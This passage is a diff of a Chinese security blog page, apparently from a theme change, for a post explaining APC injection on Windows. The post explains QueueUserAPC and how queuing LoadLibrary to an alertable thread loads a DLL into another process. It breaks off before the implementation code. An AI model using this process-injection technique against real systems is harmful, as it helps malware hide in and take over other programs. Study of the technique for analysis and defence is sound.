@@ -1,577 +1,518 @@
+
+
 <!DOCTYPE html>
-<html lang=zh>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
-  <meta name="renderer" content="webkit">
-  <meta http-equiv="Cache-Control" content="no-transform" />
-  <meta http-equiv="Cache-Control" content="no-siteapp" />
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black">
-  <meta name="format-detection" content="telephone=no,email=no,adress=no">
-  <!-- Color theme for statusbar -->
-  <meta name="theme-color" content="#000000" />
-  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
-  <meta http-equiv="window-target" content="_top" />
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
   
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="b1ackie">
+  <meta name="keywords" content="">
   
-  <title>注入技术-APC注入 | b1ackie</title>
-  <meta name="description" content="APC注入APC为异步过程调用，是指函数在特定线程中被异步执行。每一个线程都有自己的APC队列，使用QueueUserAPC函数可以把一个APC函数压入APC队列中，插入LoadLibrary就可以执行DLL。该线程并不会直接调用APC函数，除非该线程处于一个可通知的状态。 函数介绍QueueUserAPC将用户模式中的异步过程调用（APC）对象添加到指定线程的APC队列中。 12345DWORD">
-<meta property="og:type" content="article">
-<meta property="og:title" content="注入技术-APC注入">
-<meta property="og:url" content="https://b1ack1e.github.io/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/index.html">
-<meta property="og:site_name" content="b1ackie&#39;blog">
-<meta property="og:description" content="APC注入APC为异步过程调用，是指函数在特定线程中被异步执行。每一个线程都有自己的APC队列，使用QueueUserAPC函数可以把一个APC函数压入APC队列中，插入LoadLibrary就可以执行DLL。该线程并不会直接调用APC函数，除非该线程处于一个可通知的状态。 函数介绍QueueUserAPC将用户模式中的异步过程调用（APC）对象添加到指定线程的APC队列中。 12345DWORD">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://b1ack1e.github.io/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/1.png">
-<meta property="og:image" content="https://b1ack1e.github.io/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/2.png">
-<meta property="og:image" content="https://b1ack1e.github.io/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/3.png">
-<meta property="og:image" content="https://b1ack1e.github.io/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/4.png">
-<meta property="article:published_time" content="2021-07-13T07:25:36.000Z">
-<meta property="article:modified_time" content="2021-07-27T08:46:34.144Z">
-<meta property="article:author" content="b1ackie">
-<meta property="article:tag" content="恶意代码">
-<meta property="article:tag" content="黑客编程">
-<meta property="article:tag" content="注入">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://b1ack1e.github.io/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/1.png">
-  <!-- Canonical links -->
-  <link rel="canonical" href="https://b1ack1e.github.io/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/index.html">
-  
-    <link rel="alternate" href="/atom.xml" title="b1ackie&#39;blog" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png" type="image/x-icon">
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+  <title>注入技术-APC注入 - b1ackie&#39;blog</title>
 
-  
-  
-  
-  
-<meta name="generator" content="Hexo 5.4.0"></head>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
 
-<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
-  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-  <div class="slimContent">
-    <div class="navbar-header">
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
       
-      
-      <div class="profile-block text-center">
-        <a id="avatar" href="https://github.com/B1ack1e" target="_blank">
-          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
-        </a>
-        <h2 id="name" class="hidden-xs hidden-sm">b1ackie</h2>
-        <h3 id="title" class="hidden-xs hidden-sm hidden-md"></h3>
-        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> China</small>
-      </div>
-      
-      <div class="search" id="search-form-wrap">
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
 
-    <form class="search-form sidebar-form">
-        <div class="input-group">
-            <input type="text" class="search-form-input form-control" placeholder="搜索" />
-            <span class="input-group-btn">
-                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"b1ack1e.github.io","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="b1ackie'blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>b1ackie's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="注入技术-APC注入">
+              
             </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-07-13 15:25" pubdate>
+        2021-07-13 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      16
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
         </div>
-    </form>
-    <div class="ins-search">
-  <div class="ins-search-mask"></div>
-  <div class="ins-search-container">
-    <div class="ins-input-wrapper">
-      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
-      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
-    </div>
-    <div class="ins-section-wrapper">
-      <div class="ins-section-container"></div>
-    </div>
-  </div>
-</div>
-
-
-</div>
-      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
-        <span class="sr-only">Toggle navigation</span>
-        <span class="icon-bar"></span>
-        <span class="icon-bar"></span>
-        <span class="icon-bar"></span>
-      </button>
-    </div>
-    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
-      <ul class="nav navbar-nav main-nav ">
-        
-        
-        <li class="menu-item menu-item-home">
-          <a href="/.">
-            
-            <i class="icon icon-home-fill"></i>
-            
-            <span class="menu-title">首页</span>
-          </a>
-        </li>
-        
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives">
-            
-            <i class="icon icon-archives-fill"></i>
-            
-            <span class="menu-title">归档</span>
-          </a>
-        </li>
-        
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories">
-            
-            <i class="icon icon-folder"></i>
-            
-            <span class="menu-title">分类</span>
-          </a>
-        </li>
-        
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags">
-            
-            <i class="icon icon-tags"></i>
-            
-            <span class="menu-title">标签</span>
-          </a>
-        </li>
-        
-        
-        <li class="menu-item menu-item-links">
-          <a href="/links">
-            
-            <i class="icon icon-friendship"></i>
-            
-            <span class="menu-title">友链</span>
-          </a>
-        </li>
-        
-        
-        <li class="menu-item menu-item-about">
-          <a href="/about">
-            
-            <i class="icon icon-cup-fill"></i>
-            
-            <span class="menu-title">关于</span>
-          </a>
-        </li>
-        
-      </ul>
-      
-	
-    <ul class="social-links">
-    	
-        <li><a href="https://github.com/B1ack1e" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
-        
-    </ul>
-
-    </nav>
-  </div>
-</header>
-
-  
-    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
-  <div class="slimContent">
-    
-      <div class="widget">
-    <h3 class="widget-title">公告</h3>
-    <div class="widget-body">
-        <div id="board">
-            <div class="content">
-                <p>嚯！</p>
-            </div>
-        </div>
-    </div>
-</div>
-
-    
-      
-  <div class="widget">
-    <h3 class="widget-title">分类</h3>
-    <div class="widget-body">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CrackMe/">CrackMe</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/HOOK%E6%8A%80%E6%9C%AF/">HOOK技术</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/ShellCode/">ShellCode</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/">病毒分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/">黑客编程</a><span class="category-list-count">12</span></li></ul>
-    </div>
-  </div>
-
-
-    
-      
-  <div class="widget">
-    <h3 class="widget-title">标签</h3>
-    <div class="widget-body">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CrackMe/" rel="tag">CrackMe</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HOOK/" rel="tag">HOOK</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Inline-Hook/" rel="tag">Inline Hook</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PE/" rel="tag">PE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ShellCode/" rel="tag">ShellCode</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/UAC/" rel="tag">UAC</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/" rel="tag">启动技术</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/" rel="tag">恶意代码</a><span class="tag-list-count">14</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/" rel="tag">提权技术</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag">注入</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/" rel="tag">病毒分析</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/" rel="tag">自启动技术</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/" rel="tag">逆向工程</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/" rel="tag">隐藏技术</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/" rel="tag">黑客编程</a><span class="tag-list-count">13</span></li></ul>
-    </div>
-  </div>
-
-
-    
-      
-  <div class="widget">
-    <h3 class="widget-title">标签云</h3>
-    <div class="widget-body tagcloud">
-      <a href="/tags/CrackMe/" style="font-size: 13.5px;">CrackMe</a> <a href="/tags/HOOK/" style="font-size: 13px;">HOOK</a> <a href="/tags/Inline-Hook/" style="font-size: 13px;">Inline Hook</a> <a href="/tags/PE/" style="font-size: 13px;">PE</a> <a href="/tags/ShellCode/" style="font-size: 13px;">ShellCode</a> <a href="/tags/UAC/" style="font-size: 13px;">UAC</a> <a href="/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/" style="font-size: 13.17px;">启动技术</a> <a href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/" style="font-size: 14px;">恶意代码</a> <a href="/tags/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/" style="font-size: 13px;">提权技术</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">注入</a> <a href="/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/" style="font-size: 13.17px;">病毒分析</a> <a href="/tags/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/" style="font-size: 13.17px;">自启动技术</a> <a href="/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/" style="font-size: 13.67px;">逆向工程</a> <a href="/tags/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/" style="font-size: 13.17px;">隐藏技术</a> <a href="/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/" style="font-size: 13.83px;">黑客编程</a>
-    </div>
-  </div>
-
-    
-      
-  <div class="widget">
-    <h3 class="widget-title">归档</h3>
-    <div class="widget-body">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">七月 2021</a><span class="archive-list-count">21</span></li></ul>
-    </div>
-  </div>
-
-
-    
-      
-  <div class="widget">
-    <h3 class="widget-title">最新文章</h3>
-    <div class="widget-body">
-      <ul class="recent-post-list list-unstyled no-thumbnail">
-        
-          <li>
-            
-            <div class="item-inner">
-              <p class="item-category">
-                <a class="category-link" href="/categories/CrackMe/">CrackMe</a>
-              </p>
-              <p class="item-title">
-                <a href="/2021/08/03/160CrackMe-007/" class="title">160CrackMe-007</a>
-              </p>
-              <p class="item-date">
-                <time datetime="2021-08-03T02:52:32.000Z" itemprop="datePublished">2021-08-03</time>
-              </p>
-            </div>
-          </li>
-          
-          <li>
-            
-            <div class="item-inner">
-              <p class="item-category">
-                <a class="category-link" href="/categories/CrackMe/">CrackMe</a>
-              </p>
-              <p class="item-title">
-                <a href="/2021/08/02/160CrackMe-006/" class="title">160CrackMe-006</a>
-              </p>
-              <p class="item-date">
-                <time datetime="2021-08-02T10:19:24.000Z" itemprop="datePublished">2021-08-02</time>
-              </p>
-            </div>
-          </li>
-          
-          <li>
-            
-            <div class="item-inner">
-              <p class="item-category">
-                <a class="category-link" href="/categories/CrackMe/">CrackMe</a>
-              </p>
-              <p class="item-title">
-                <a href="/2021/07/29/160CrackMe-004/" class="title">160CrackMe-004</a>
-              </p>
-              <p class="item-date">
-                <time datetime="2021-07-29T02:29:39.000Z" itemprop="datePublished">2021-07-29</time>
-              </p>
-            </div>
-          </li>
-          
-          <li>
-            
-            <div class="item-inner">
-              <p class="item-category">
-                <a class="category-link" href="/categories/HOOK%E6%8A%80%E6%9C%AF/">HOOK技术</a>
-              </p>
-              <p class="item-title">
-                <a href="/2021/07/28/HOOK-Inline%20Hook/" class="title">HOOK-Inline Hook</a>
-              </p>
-              <p class="item-date">
-                <time datetime="2021-07-28T03:17:15.000Z" itemprop="datePublished">2021-07-28</time>
-              </p>
-            </div>
-          </li>
-          
-          <li>
-            
-            <div class="item-inner">
-              <p class="item-category">
-                <a class="category-link" href="/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/">黑客编程</a>
-              </p>
-              <p class="item-title">
-                <a href="/2021/07/27/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F/" class="title">隐藏技术-进程隐藏</a>
-              </p>
-              <p class="item-date">
-                <time datetime="2021-07-27T03:25:51.000Z" itemprop="datePublished">2021-07-27</time>
-              </p>
-            </div>
-          </li>
-          
-      </ul>
-    </div>
-  </div>
-  
-
-    
-  </div>
-</aside>
-
-  
-  
-<main class="main" role="main">
-  <div class="content">
-  <article id="post-注入技术-APC注入" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-    
-    <div class="article-header">
-      
-        
-  
-    <h1 class="article-title" itemprop="name">
-      注入技术-APC注入
-    </h1>
-  
-
-      
-      <div class="article-meta">
-        <span class="article-date">
-    <i class="icon icon-calendar-check"></i>
-	<a href="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/" class="article-date">
-	  <time datetime="2021-07-13T07:25:36.000Z" itemprop="datePublished">2021-07-13</time>
-	</a>
-</span>
-        
-  <span class="article-category">
-    <i class="icon icon-folder"></i>
-    <a class="article-category-link" href="/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/">黑客编程</a>
-  </span>
-
-        
-  <span class="article-tag">
-    <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/" rel="tag">恶意代码</a>, <a class="article-tag-link-link" href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag">注入</a>, <a class="article-tag-link-link" href="/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/" rel="tag">黑客编程</a>
-  </span>
-
-
-        
-	<span class="article-read hidden-xs">
-	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
-	    <span id="busuanzi_container_page_pv">
-			<span id="busuanzi_value_page_pv">0</span>
-		</span>
-	</span>
-
-
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/#comments" class="article-comment-link">评论</a></span>
-        
-	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 1.1k(字)</span>
-	
-	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 5(分)</span>
-	
-
       </div>
     </div>
-    <div class="article-entry marked-body" itemprop="articleBody">
+  </header>
+
+  <main>
+    
       
-        <h4 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h4><p>APC为异步过程调用，是指函数在特定线程中被异步执行。每一个线程都有自己的APC队列，使用QueueUserAPC函数可以把一个APC函数压入APC队列中，插入LoadLibrary就可以执行DLL。该线程并不会直接调用APC函数，除非该线程处于一个可通知的状态。</p>
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">注入技术-APC注入</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021-08-06 下午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h4 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h4><p>APC为异步过程调用，是指函数在特定线程中被异步执行。每一个线程都有自己的APC队列，使用QueueUserAPC函数可以把一个APC函数压入APC队列中，插入LoadLibrary就可以执行DLL。该线程并不会直接调用APC函数，除非该线程处于一个可通知的状态。</p>
 <h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="QueueUserAPC"><a href="#QueueUserAPC" class="headerlink" title="QueueUserAPC"></a>QueueUserAPC</h5><p>将用户模式中的异步过程调用（APC）对象添加到指定线程的APC队列中。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD QueueUserAPC(</span><br><span class="line">  PAPCFUNC  pfnAPC,</span><br><span class="line">  HANDLE    hThread,</span><br><span class="line">  ULONG_PTR dwData</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">DWORD <span class="hljs-title">QueueUserAPC</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  PAPCFUNC  pfnAPC,</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE    hThread,</span></span><br><span class="hljs-params"><span class="hljs-function">  ULONG_PTR dwData</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure>
 
 <p>pfnAPC：当指定线程执行可警告的等待操作时，指向应用程序提供的APC函数的指针。</p>
 <p>hThread：线程的句柄。该句柄必须具有THREAD_SET_CONTEXT访问权限。</p>
 <p>dwData：传递由pfnAPC参数指向的APC函数的单个值。</p>
 <p>返回值：如果函数成功，则返回值为非0；如果失败，则返回值为0。</p>
 <h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>在Windows系统中，每个线程都会维护一个线程APC队列，通过QueueUserAPC把一个APC函数添加到指定线程的APC队列中。每个线程都有自己的APC队列，这个APC队列记录了要求线程执行的一些APC函数。Windows系统会发出一个软中断去执行这些APC函数，对于用户模式下的APC队列，当线程处在可警告状态时才会执行这些APC函数。一个线程在内部使用SingalObjectAndWait、SleepEx、WaitForSingleObjectEx等函数把自己挂起时就是进入警告状态，此时便会执行APC队列函数。</p>
-<h5 id="具体代码如下："><a href="#具体代码如下：" class="headerlink" title="具体代码如下："></a>具体代码如下：</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span 